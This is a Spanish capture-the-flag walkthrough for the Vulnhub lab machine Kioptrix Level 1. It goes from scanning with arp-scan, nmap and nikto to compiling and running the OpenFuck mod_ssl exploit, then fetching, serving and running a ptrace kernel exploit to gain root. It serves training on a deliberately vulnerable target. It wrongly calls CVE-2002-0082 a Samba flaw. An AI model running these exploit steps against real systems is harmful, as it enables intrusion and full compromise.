<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=F7F400&width=320&height=80&lines=KIOPTRIX_1"></a>
</p>

<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

<h1 align="center"></h1>

</br>

- *Paso 1:* Identificar la IP de la máquina host con Arp-Scan. 
```
arp-scan --interface wlan0 -l
```
![1](https://user-images.githubusercontent.com/75953873/177676522-7542cd60-297b-4537-a657-a6e613e22122.png)

IP host: `192.168.1.104`

- *Paso 2:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -vvv 192.168.1.104
```
![2](https://user-images.githubusercontent.com/75953873/177677054-4379065b-7b00-4c1a-a2b7-63688488f52e.png)

Puertos abiertos: [22,80,111,139,443]

- *Paso 3:* Detección de servicios y sistema operativo. 
```
nmap -p 22,80,111,139,443 -A 192.168.1.104
```
![3](https://user-images.githubusercontent.com/75953873/177677619-5b6fa806-14d5-4474-b6a8-800e1a8b8618.png)

![4](https://user-images.githubusercontent.com/75953873/177677647-f1513f29-98ca-40bd-901e-ac9466faa0aa.png)

Servidor corriendo: **HTTP Apache** (puerto 80 y 443)

O.S: **Linux**

URL: `http://192.168.1.104`

![5](https://user-images.githubusercontent.com/75953873/177677946-e9cfd943-0c77-44a3-991c-c2d5a0377648.png)

- *Paso 4:* Escanear vulnerabilidades en el servidor con Nikto. 
```
nikto -h http:///192.168.1.104
```
![6](https://user-images.githubusercontent.com/75953873/177678387-f0e381c3-874c-4919-b910-15f9fd2e5de6.png)

Vulnerabilidad **CVE-2002-0082**: permite que un atacante explote el desbordamiento de búfer que se encuentra en las versiones de Samba 2.2.0 a 2.2.8.

https://www.cvedetails.com/cve/CVE-2002-0082/

- *Paso 5:* Localizar exploti, descargarlo, compilarlo y ejecutarlo. 
```
searchsploit -m 47080
```
![8](https://user-images.githubusercontent.com/75953873/177683169-2b356aea-a453-4d46-9e64-6bf3a0906d15.png)

```
mv 47080.c OpenFuck.c
gcc -o OpenFuck OpenFuck.c -lcrypto
./OpenFuck 0x6b 192.168.1.104 443 -c 40
```
![7](https://user-images.githubusercontent.com/75953873/177683272-6f97282a-31d1-46be-94c9-3020f0e959be.png)

```
wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
mv ptrace-kmod.c ptrace.c
python3 -m http.server 80
```
![10](https://user-images.githubusercontent.com/75953873/177688536-4457928c-35d9-4f25-96c4-e63533b71702.png)

```
cd /tmp
gcc -o exploit ptrace.c
chmod +x exploit
./exploit
cd /root
cat anaconda-ks.cfg
```
![9](https://user-images.githubusercontent.com/75953873/177688261-c2596953-e1ff-47d5-a64e-0f67619cad50.png)
